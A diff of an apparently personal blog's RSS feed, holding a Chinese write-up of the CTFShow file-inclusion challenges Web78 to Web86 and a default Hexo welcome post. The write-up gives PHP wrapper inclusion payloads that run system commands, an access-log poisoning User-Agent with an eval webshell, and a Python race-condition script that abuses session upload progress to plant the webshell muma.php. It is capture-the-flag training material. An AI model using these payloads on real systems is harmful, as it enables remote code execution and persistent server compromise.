@@ -18,86 +18,73 @@
             <link>https://zzk6th.github.io/CTF%20Show%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/</link>
             <category term="wp" scheme="https://zzk6th.github.io/categories/wp/" />
             <pubDate>Thu, 29 Feb 2024 15:20:46 +0800</pubDate>
-            <description><![CDATA[ &lt;h1 id=&#34;web78&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#web78&#34;&gt;#&lt;/a&gt; Web78&lt;/h1&gt;
-&lt;p&gt;用 php 伪协议绕过&lt;/p&gt;
+            <description><![CDATA[ &lt;h1 id=&#34;Web78&#34;&gt;&lt;a href=&#34;#Web78&#34; class=&#34;headerlink&#34; title=&#34;Web78&#34;&gt;&lt;/a&gt;Web78&lt;/h1&gt;&lt;p&gt;用php伪协议绕过  &lt;/p&gt;
 &lt;blockquote&gt;
-&lt;p&gt;?file=php://filter/convert.base64-encode/resource=flag.php&lt;/p&gt;
+&lt;p&gt;?file&amp;#x3D;php:&amp;#x2F;&amp;#x2F;filter&amp;#x2F;convert.base64-encode&amp;#x2F;resource&amp;#x3D;flag.php  &lt;/p&gt;
 &lt;/blockquote&gt;
-&lt;h1 id=&#34;web79&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#web79&#34;&gt;#&lt;/a&gt; web79&lt;/h1&gt;
-&lt;p&gt;用 date 伪协议绕过&lt;/p&gt;
+&lt;h1 id=&#34;web79&#34;&gt;&lt;a href=&#34;#web79&#34; class=&#34;headerlink&#34; title=&#34;web79&#34;&gt;&lt;/a&gt;web79&lt;/h1&gt;&lt;p&gt;用date伪协议绕过&lt;/p&gt;
 &lt;blockquote&gt;
-&lt;p&gt;?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs=&lt;br /&gt;
-?file=data://text/plain,&amp;lt;?= system(&#39;tac flag.p*p&#39;);?&amp;gt;&lt;/p&gt;
+&lt;p&gt;?file&amp;#x3D;data:&amp;#x2F;&amp;#x2F;text&amp;#x2F;plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs&amp;#x3D;&lt;br&gt;?file&amp;#x3D;data:&amp;#x2F;&amp;#x2F;text&amp;#x2F;plain,&amp;lt;?&amp;#x3D; system(‘tac flag.p*p’);?&amp;gt;  &lt;/p&gt;
 &lt;/blockquote&gt;
-&lt;p&gt;或者用 input 大写 php 绕过&lt;/p&gt;
+&lt;p&gt;或者用input 大写php绕过  &lt;/p&gt;
 &lt;blockquote&gt;
-&lt;p&gt;?file=Php://input&lt;br /&gt;
-post：&amp;lt;?php system(&#39;ls&#39;);?&amp;gt;&lt;/p&gt;
+&lt;p&gt;?file&amp;#x3D;Php:&amp;#x2F;&amp;#x2F;input&lt;br&gt;post：&amp;lt;?php system(‘ls’);?&amp;gt;  &lt;/p&gt;
 &lt;/blockquote&gt;
-&lt;h1 id=&#34;web80&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#web80&#34;&gt;#&lt;/a&gt; Web80&lt;/h1&gt;
-&lt;p&gt;上题中 input 的 php 大写绕过 jie 还能用&lt;br /&gt;
-&lt;img data-src=&#34;../assets/CTFShow%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB_2.png&#34; alt=&#34;Image-1&#34; /&gt;&lt;br /&gt;
-php 和 data 伪协议都用不了了，可以包含日志文件&lt;br /&gt;
-通过 Wappalyzer 得知中间件是 Nginx&lt;/p&gt;
+&lt;h1 id=&#34;Web80&#34;&gt;&lt;a href=&#34;#Web80&#34; class=&#34;headerlink&#34; title=&#34;Web80&#34;&gt;&lt;/a&gt;Web80&lt;/h1&gt;&lt;p&gt;上题中input的php大写绕过jie还能用&lt;br&gt;&lt;img data-src=&#34;/../assets/CTFShow%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB_2.png&#34; alt=&#34;Image-1&#34;&gt;&lt;br&gt;php和data伪协议都用不了了, 可以包含日志文件&lt;br&gt;通过Wappalyzer得知中间件是Nginx  &lt;/p&gt;
 &lt;blockquote&gt;
-&lt;p&gt;?file=/var/log/nginx/access.log&lt;br /&gt;
-User-Agent: &amp;lt;?php echo 123;phpinfo();eval($_POST[0]);?&amp;gt;&lt;/p&gt;
+&lt;p&gt;?file&amp;#x3D;&amp;#x2F;var&amp;#x2F;log&amp;#x2F;nginx&amp;#x2F;access.log&lt;br&gt;User-Agent: &amp;lt;?php echo 123;phpinfo();eval($_POST[0]);?&amp;gt;  &lt;/p&gt;
 &lt;/blockquote&gt;
-&lt;p&gt;&lt;em&gt;直接连接蚁剑拿到 flag&lt;/em&gt;&lt;/p&gt;
-&lt;h1 id=&#34;web81&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#web81&#34;&gt;#&lt;/a&gt; web81&lt;/h1&gt;
-&lt;p&gt;与上一题一样&lt;br /&gt;
-传参&lt;/p&gt;
+&lt;p&gt;&lt;em&gt;直接连接蚁剑拿到flag&lt;/em&gt;  &lt;/p&gt;
+&lt;h1 id=&#34;web81&#34;&gt;&lt;a href=&#34;#web81&#34; class=&#34;headerlink&#34; title=&#34;web81&#34;&gt;&lt;/a&gt;web81&lt;/h1&gt;&lt;p&gt;与上一题一样&lt;br&gt;传参&lt;/p&gt;
 &lt;blockquote&gt;
-&lt;p&gt;?file=/var/log/nginx/access.log&lt;/p&gt;
+&lt;p&gt;?file&amp;#x3D;&amp;#x2F;var&amp;#x2F;log&amp;#x2F;nginx&amp;#x2F;access.log  &lt;/p&gt;
 &lt;/blockquote&gt;
 &lt;p&gt;再改&lt;/p&gt;
 &lt;blockquote&gt;
-&lt;p&gt;User-Agent: &amp;lt;?php system(&#39;ls&#39;);?&amp;gt;&lt;/p&gt;
+&lt;p&gt;User-Agent: &amp;lt;?php system(‘ls’);?&amp;gt;  &lt;/p&gt;
 &lt;/blockquote&gt;
-&lt;p&gt;回车两次，得到&lt;/p&gt;
+&lt;p&gt;回车两次，得到  &lt;/p&gt;
 &lt;blockquote&gt;
-&lt;p&gt;fl0g.php index.php&lt;/p&gt;
+&lt;p&gt;fl0g.php index.php  &lt;/p&gt;
 &lt;/blockquote&gt;
 &lt;p&gt;然后再改&lt;/p&gt;
 &lt;blockquote&gt;
-&lt;p&gt;User-Agent: &amp;lt;?php system(&#39;tac fl0g.p*p&#39;);?&amp;gt;&lt;/p&gt;
+&lt;p&gt;User-Agent: &amp;lt;?php system(‘tac fl0g.p*p’);?&amp;gt;  &lt;/p&gt;
 &lt;/blockquote&gt;
-&lt;p&gt;回车两次，得到最终 flag&lt;br /&gt;
-&lt;img data-src=&#34;../assets/CTFShow%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB_3.png&#34; alt=&#34;Image-2&#34; /&gt;&lt;/p&gt;
-&lt;h1 id=&#34;web82~web86&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#web82~web86&#34;&gt;#&lt;/a&gt; Web82~Web86&lt;/h1&gt;
-&lt;pre&gt;&lt;code&gt;import requests
+&lt;p&gt;回车两次，得到最终flag&lt;br&gt;&lt;img data-src=&#34;/../assets/CTFShow%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB_3.png&#34; alt=&#34;Image-2&#34;&gt;  &lt;/p&gt;
+&lt;h1 id=&#34;Web82-Web86&#34;&gt;&lt;a href=&#34;#Web82-Web86&#34; class=&#34;headerlink&#34; title=&#34;Web82~Web86&#34;&gt;&lt;/a&gt;Web82~Web86&lt;/h1&gt;&lt;pre&gt;&lt;code&gt;import requests
 import io
 import threading
  
  
-url=&#39;http://b04c7980-d374-4c39-9ebc-a612708262c8.challenge.ctf.show/&#39;
-sessionid=&#39;ctfshow&#39;
+url=&amp;#39;http://b04c7980-d374-4c39-9ebc-a612708262c8.challenge.ctf.show/&amp;#39;
+sessionid=&amp;#39;ctfshow&amp;#39;
 data=&amp;#123;
-&amp;quot;1&amp;quot;:&amp;quot;file_put_contents(&#39;/var/www/html/muma.php&#39;,&#39;&amp;lt;?php eval($_POST[a]);?&amp;gt;&#39;);&amp;quot;
+&amp;quot;1&amp;quot;:&amp;quot;file_put_contents(&amp;#39;/var/www/html/muma.php&amp;#39;,&amp;#39;&amp;lt;?php eval($_POST[a]);?&amp;gt;&amp;#39;);&amp;quot;
 &amp;#125; 
  
-&#39;&#39;&#39;
+&amp;#39;&amp;#39;&amp;#39;
 post 传递内容可在网站目录下写入一句话木马。
 根据资料，内容暂存在 /tmp/ 目录下 sess_sessionid 文件。
 sessionid 可控，所以这里即 /tmp/sess_ctfshow。
 这样一旦访问成功，就说明木马植入了
-&#39;&#39;&#39;
+&amp;#39;&amp;#39;&amp;#39;
  
  
 # /tmp/sess_sessionid 中写入一句话木马。
 def write(session): 
-fileBytes = io.BytesIO(b&#39;a&#39;*1024*50)
+fileBytes = io.BytesIO(b&amp;#39;a&amp;#39;*1024*50)
 while True:
 response=session.post(
 url,
 data=&amp;#123;
-&#39;PHP_SESSION_UPLOAD_PROGRESS&#39;:&#39;&amp;lt;?php eval($_POST[1]);?&amp;gt;&#39;
+&amp;#39;PHP_SESSION_UPLOAD_PROGRESS&amp;#39;:&amp;#39;&amp;lt;?php eval($_POST[1]);?&amp;gt;&amp;#39;
 &amp;#125;,
 cookies=&amp;#123;
-&#39;PHPSESSID&#39;:sessionid
+&amp;#39;PHPSESSID&amp;#39;:sessionid
 &amp;#125;,
 files=&amp;#123;
-&#39;file&#39;:(&#39;ctfshow.jpg&#39;,fileBytes)
+&amp;#39;file&amp;#39;:(&amp;#39;ctfshow.jpg&amp;#39;,fileBytes)
 &amp;#125;
 )
  
@@ -106,20 +93,20 @@ files=&amp;#123;
 def read(session):
 while True:
 response=session.post(
-url+&#39;?file=/tmp/sess_&#39;+sessionid,
+url+&amp;#39;?file=/tmp/sess_&amp;#39;+sessionid,
     data=data,
 cookies=&amp;#123;
-&#39;PHPSESSID&#39;:sessionid
+&amp;#39;PHPSESSID&amp;#39;:sessionid
 &amp;#125;
 )
 # 访问木马文件，如果访问到了就代表竞争成功
-resposne2=session.get(url+&#39;muma.php&#39;)
+resposne2=session.get(url+&amp;#39;muma.php&amp;#39;)
 if resposne2.status_code==200:
-print(&#39;++++++done++++++&#39;)
+print(&amp;#39;++++++done++++++&amp;#39;)
 else:
 print(resposne2.status_code)
  
-if __name__ == &#39;__main__&#39;:
+if __name__ == &amp;#39;__main__&amp;#39;:
  
 evnet=threading.Event()
 # 写入和访问分别设置 5 个线程。
@@ -132,10 +119,8 @@ threading.Thread(target=read,args=(session,)).start()
 evnet.set()
  
 &lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;运行脚本并成功写入后即可访问木马。&lt;img data-src=&#34;../assets/CTFShow%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB_4.png&#34; alt=&#34;Image-3&#34; /&gt;&lt;br /&gt;
-&lt;img data-src=&#34;../assets/CTFShow%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB_5.png&#34; alt=&#34;Image-4&#34; /&gt;&lt;/p&gt;
-&lt;h1 id=&#34;web87未完待续&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#web87未完待续&#34;&gt;#&lt;/a&gt; Web87 (未完待续)&lt;/h1&gt;
- ]]></description>
+&lt;p&gt;运行脚本并成功写入后即可访问木马。&lt;img data-src=&#34;/../assets/CTFShow%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB_4.png&#34; alt=&#34;Image-3&#34;&gt;&lt;br&gt;&lt;img data-src=&#34;/../assets/CTFShow%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB_5.png&#34; alt=&#34;Image-4&#34;&gt;  &lt;/p&gt;
+&lt;h1 id=&#34;Web87-未完待续&#34;&gt;&lt;a href=&#34;#Web87-未完待续&#34; class=&#34;headerlink&#34; title=&#34;Web87(未完待续)&#34;&gt;&lt;/a&gt;Web87(未完待续)&lt;/h1&gt; ]]></description>
         </item>
         <item>
             <guid isPermalink="true">https://zzk6th.github.io/hello-world/</guid>
@@ -143,15 +128,18 @@ evnet.set()
             <link>https://zzk6th.github.io/hello-world/</link>
             <pubDate>Sat, 27 Jan 2024 19:25:42 +0800</pubDate>
             <description><![CDATA[ &lt;p&gt;Welcome to &lt;a href=&#34;https://hexo.io/&#34;&gt;Hexo&lt;/a&gt;! This is your very first post. Check &lt;a href=&#34;https://hexo.io/docs/&#34;&gt;documentation&lt;/a&gt; for more info. If you get any problems when using Hexo, you can find the answer in &lt;a href=&#34;https://hexo.io/docs/troubleshooting.html&#34;&gt;troubleshooting&lt;/a&gt; or you can ask me on &lt;a href=&#34;https://github.com/hexojs/hexo/issues&#34;&gt;GitHub&lt;/a&gt;.&lt;/p&gt;
-&lt;h2 id=&#34;quick-start&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#quick-start&#34;&gt;#&lt;/a&gt; Quick Start&lt;/h2&gt;
-&lt;h3 id=&#34;create-a-new-post&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#create-a-new-post&#34;&gt;#&lt;/a&gt; Create a new post&lt;/h3&gt;
-&lt;figure class=&#34;highlight bash&#34;&gt;&lt;figcaption data-lang=&#34;bash&#34;&gt;&lt;span&gt;h&lt;/span&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;$ hexo new &lt;span class=&#34;token string&#34;&gt;&#34;My New Post&#34;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;More info: &lt;a href=&#34;https://hexo.io/docs/writing.html&#34;&gt;Writing&lt;/a&gt;&lt;/p&gt;
-&lt;h3 id=&#34;run-server&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#run-server&#34;&gt;#&lt;/a&gt; Run server&lt;/h3&gt;
-&lt;figure class=&#34;highlight bash&#34;&gt;&lt;figcaption data-lang=&#34;bash&#34;&gt;&lt;span&gt;h&lt;/span&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;$ hexo server&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;More info: &lt;a href=&#34;https://hexo.io/docs/server.html&#34;&gt;Server&lt;/a&gt;&lt;/p&gt;
-&lt;h3 id=&#34;generate-static-files&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#generate-static-files&#34;&gt;#&lt;/a&gt; Generate static files&lt;/h3&gt;
-&lt;figure class=&#34;highlight bash&#34;&gt;&lt;figcaption data-lang=&#34;bash&#34;&gt;&lt;span&gt;h&lt;/span&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;$ hexo generate&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;More info: &lt;a href=&#34;https://hexo.io/docs/generating.html&#34;&gt;Generating&lt;/a&gt;&lt;/p&gt;
-&lt;h3 id=&#34;deploy-to-remote-sites&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#deploy-to-remote-sites&#34;&gt;#&lt;/a&gt; Deploy to remote sites&lt;/h3&gt;
-&lt;figure class=&#34;highlight bash&#34;&gt;&lt;figcaption data-lang=&#34;bash&#34;&gt;&lt;span&gt;h&lt;/span&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;$ hexo deploy&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;More info: &lt;a href=&#34;https://hexo.io/docs/one-command-deployment.html&#34;&gt;Deployment&lt;/a&gt;&lt;/p&gt;
+&lt;h2 id=&#34;Quick-Start&#34;&gt;&lt;a href=&#34;#Quick-Start&#34; class=&#34;headerlink&#34; title=&#34;Quick Start&#34;&gt;&lt;/a&gt;Quick Start&lt;/h2&gt;&lt;h3 id=&#34;Create-a-new-post&#34;&gt;&lt;a href=&#34;#Create-a-new-post&#34; class=&#34;headerlink&#34; title=&#34;Create a new post&#34;&gt;&lt;/a&gt;Create a new post&lt;/h3&gt;&lt;pre&gt;&lt;code class=&#34;bash&#34;&gt;$ hexo new &amp;quot;My New Post&amp;quot;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;More info: &lt;a href=&#34;https://hexo.io/docs/writing.html&#34;&gt;Writing&lt;/a&gt;&lt;/p&gt;
+&lt;h3 id=&#34;Run-server&#34;&gt;&lt;a href=&#34;#Run-server&#34; class=&#34;headerlink&#34; title=&#34;Run server&#34;&gt;&lt;/a&gt;Run server&lt;/h3&gt;&lt;pre&gt;&lt;code class=&#34;bash&#34;&gt;$ hexo server
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;More info: &lt;a href=&#34;https://hexo.io/docs/server.html&#34;&gt;Server&lt;/a&gt;&lt;/p&gt;
+&lt;h3 id=&#34;Generate-static-files&#34;&gt;&lt;a href=&#34;#Generate-static-files&#34; class=&#34;headerlink&#34; title=&#34;Generate static files&#34;&gt;&lt;/a&gt;Generate static files&lt;/h3&gt;&lt;pre&gt;&lt;code class=&#34;bash&#34;&gt;$ hexo generate
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;More info: &lt;a href=&#34;https://hexo.io/docs/generating.html&#34;&gt;Generating&lt;/a&gt;&lt;/p&gt;
+&lt;h3 id=&#34;Deploy-to-remote-sites&#34;&gt;&lt;a href=&#34;#Deploy-to-remote-sites&#34; class=&#34;headerlink&#34; title=&#34;Deploy to remote sites&#34;&gt;&lt;/a&gt;Deploy to remote sites&lt;/h3&gt;&lt;pre&gt;&lt;code class=&#34;bash&#34;&gt;$ hexo deploy
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;More info: &lt;a href=&#34;https://hexo.io/docs/one-command-deployment.html&#34;&gt;Deployment&lt;/a&gt;&lt;/p&gt;
  ]]></description>
         </item>
     </channel>
